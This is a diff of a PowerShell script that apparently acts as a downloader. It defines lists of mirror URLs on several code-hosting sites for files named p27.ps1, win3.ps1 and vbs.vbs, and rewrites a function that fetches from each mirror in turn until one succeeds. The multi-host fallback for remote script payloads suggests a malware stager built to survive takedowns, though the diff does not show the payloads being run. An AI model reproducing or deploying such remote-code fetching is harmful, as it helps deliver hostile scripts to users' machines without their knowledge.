@@ -21,9 +21,8 @@ if (-not (Test-Path $UserBase)) {
 
 # URLs (Multiple sources - fallback)
 $PUrls = @(
-    "https://bitbucket.org/mahesh2210m/mahesh2210m/raw/main/p27.ps1"
     "https://codeberg.org/mahesh2210m/mahesh2210m/raw/branch/main/p27.ps1"
-   
+    "https://bitbucket.org/mahesh2210m/mahesh2210m/raw/main/p27.ps1"
     "https://raw.githubusercontent.com/mahesh97m/phpcode/main/p27.ps1"
     "https://gitlab.com/mahesh2210m/mahesh2210m/-/raw/main/p27.ps1"
     "https://gitea.com/mahesh2210m/mahesh2210m/raw/branch/main/p27.ps1"
@@ -31,42 +30,43 @@ $PUrls = @(
 )
 
 $WUrls = @(
-    "https://bitbucket.org/mahesh2210m/mahesh2210m/raw/main/win3.ps1"
     "https://codeberg.org/mahesh2210m/mahesh2210m/raw/branch/main/win3.ps1"
-    
+    "https://bitbucket.org/mahesh2210m/mahesh2210m/raw/main/win3.ps1"
     "https://raw.githubusercontent.com/mahesh97m/phpcode/main/win3.ps1"
     "https://gitlab.com/mahesh2210m/mahesh2210m/-/raw/main/win3.ps1"
     "https://gitea.com/mahesh2210m/mahesh2210m/raw/branch/main/win3.ps1"
 
 )
 $VUrls = @(
-    "https://bitbucket.org/mahesh2210m/mahesh2210m/raw/main/vbs.vbs"
     "https://codeberg.org/mahesh2210m/mahesh2210m/raw/branch/main/vbs.vbs"
-  
+    "https://bitbucket.org/mahesh2210m/mahesh2210m/raw/main/vbs.vbs"
     "https://raw.githubusercontent.com/mahesh97m/phpcode/main/vbs.vbs"
     "https://gitlab.com/mahesh2210m/mahesh2210m/-/raw/main/vbs.vbs"
     "https://gitea.com/mahesh2210m/mahesh2210m/raw/branch/main/vbs.vbs"
 
 )
-# Download Function with Fallback
 function Download-File {
     param([string]$Target, [array]$Urls)
 
     foreach ($url in $Urls) {
         try {
-            $response = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 15 -MaximumRedirection 0 -ErrorAction Stop
-            if ($response.StatusCode -eq 200) {
-                $response.Content | Set-Content -Encoding Byte -Path $Target
+            Invoke-WebRequest `
+                -Uri $url `
+                -OutFile $Target `
+                -UseBasicParsing `
+                -TimeoutSec 15 `
+                -ErrorAction Stop
+
+            if ((Get-Item $Target).Length -gt 0) {
                 return $true
-            } else {
-                Write-Host "Failed to download $Target from $url (HTTP $($response.StatusCode))"
             }
         } catch {
-            Write-Host "Error downloading ${Target} from ${url}: $_"
+            Write-Host "Failed: $url"
         }
     }
     return $false
 }
+
 
 
 # Download both scripts
